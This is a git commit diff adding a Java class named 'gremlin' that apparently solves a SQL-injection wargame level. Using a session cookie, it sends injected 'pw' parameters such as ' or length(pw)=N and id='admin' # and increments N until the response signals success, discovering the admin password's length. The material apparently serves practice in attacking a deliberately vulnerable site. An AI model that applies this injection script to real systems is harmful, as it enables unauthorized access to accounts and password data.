2d0de6c3fccc967c6afec940a9ca9ed2a742b7c2
se-hyun Hwang <imscs21@naver.com>
2016-12-29 13:08:32 +0900

    Update gremlin.java

--- gremlin.java
+++ gremlin.java
@@ -3,7 +3,44 @@ import java.util.*;
 import java.net.*;
 
 public class gremlin
-implements Runnable
+extends BaseClass
 {
+@Override
+public void run(){
+		Configure conf = new Configure();
+		if(conf.getToken().equals("exit")){
+			return;
+		}
 
+		try{
+			final String cookie_content = "PHPSESSID="+conf.getToken()+";";
+			int pwlen=-1;
+			String content="";
+			int lenhelper = 40;
+			while(pwlen==-1){
+				String sub_query = "?"+String.format("pw=%%27%%20or%%20length(pw)=%d%%20%s%%23",lenhelper,URLEncoder.encode(" and id='admin' "));
+				content=queryContent(conf,cookie_content,sub_query);
+				
+				if(isSuccess(content)){
+					pwlen=(lenhelper);
+					pwlen=lenhelper;
+					
+				}
+				else{
+					lenhelper++;
+				}
+			}
+			
+		}
+		catch(Exception e){}
+	}
+public static void main(String... args){
+
+		gremlin bi = new gremlin();
+		Thread th = new Thread(bi);
+		th.start();
+		try{
+			th.join();}catch(Exception e){}
+		System.out.println("program finish");
+	}
 }
